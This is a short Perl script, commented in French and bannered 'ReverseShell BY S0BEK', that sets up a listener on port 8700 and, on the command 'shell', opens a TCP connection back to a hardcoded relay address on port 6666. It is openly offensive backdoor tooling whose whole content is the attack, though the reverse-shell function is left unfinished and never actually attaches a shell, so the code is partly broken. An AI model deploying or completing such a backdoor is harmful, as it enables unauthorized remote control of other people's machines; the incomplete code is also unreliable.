#!/usr/bin/perl -w

use strict;
use IO::Socket;

#notre adresse ip publique qui sera en fait l'adresse d'un serveur rebond
my $publicip = "192.168.0.23";

############### FUNCTIONS ###############

sub print_banner {
    my $banner = <<BAN;
#####################################################################

mmmmm                               mmmm  #             ""#    ""#   
#   "#  mmm   m   m   mmm    m mm  #"   " # mm    mmm     #      #   
#mmmm" #"  #  "m m"  #"  #   #"  " "#mmm  #"  #  #"  #    #      #   
#   "m #""""   #m#   #""""   #         "# #   #  #""""    #      #   
#    " "#mm"    #    "#mm"   #     "mmm#" #   #  "#mm"    "mm    "mm 

\t\t\tBY S0BEK!
#####################################################################                                        
BAN
    return $banner;
}

sub reverse_shell {
    my ( $shellsock, $shellip, $shellport ) = ( "", "$publicip", 6666 );
    $shellsock = new IO::Socket::INET(
        PeerHost => $shellip,
        PeerPort => $shellport,
        Proto    => 'tcp'
    ) or die;

    #print $shellsock "Connexion etablie sur le serveur\n";

}

############### MAIN ###############

my ( $sock, $client, $port );
$port = 8700;

#mise en place du serveur
$sock = new IO::Socket::INET(
    Proto => 'tcp',

    # LocalHost => '127.0.0.1',
    LocalPort => $port,
    Listen    => SOMAXCONN,
    Reuse     => 1
) or die;

#reception des connexions entrantes
while ( $client = $sock->accept() ) {
    $client->autoflush(1);

    $client->send( print_banner() );
    $client->send(">");

    if ( defined($client) ) {

    }

    #reception des directives
    while (<$client>) {
        chomp;

        $client->send(">");

        if (/quit/) {
            close($client) or die;
        }

        reverse_shell() if (/shell/);

    }
    continue {
        print( $client , ">" );
    }
    close($client);
}
